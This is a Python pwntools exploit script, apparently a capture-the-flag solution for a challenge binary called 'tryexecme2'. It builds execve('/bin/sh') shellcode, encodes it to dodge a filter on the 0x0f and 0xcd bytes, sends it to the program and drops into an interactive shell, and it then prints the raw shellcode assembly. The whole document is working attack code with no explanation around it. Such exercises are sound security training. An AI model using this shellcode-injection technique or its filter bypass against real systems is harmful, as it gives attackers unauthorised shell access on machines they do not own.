#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

# r = remote("10.10.62.203", 5002)

r = process("./tryexecme2")

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Encode the shellcode to avoid 0x0f and 0xcd
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")

r.recvuntil(b"Give me your spell, and I will execute it: \n")
r.sendline(encoded_shellcode)
r.interactive("$ ")

shellcode = '''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    
    /* call execve() */
    push 59 /* 0x3b */
    pop rax
    syscall
'''